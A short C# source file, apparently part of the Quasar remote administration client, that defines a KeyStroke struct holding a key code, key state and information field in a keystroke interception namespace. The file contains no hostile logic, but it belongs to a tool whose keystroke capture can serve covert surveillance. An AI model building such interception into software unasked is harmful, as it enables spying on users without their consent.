using System;
using System.Runtime.InteropServices;

namespace Quasar.Client.Interception
{

    [StructLayout(LayoutKind.Sequential)]
    public struct KeyStroke
    {

        public KeyCode Code;
        public KeyState State;

        public UInt32 Information;

    }

}
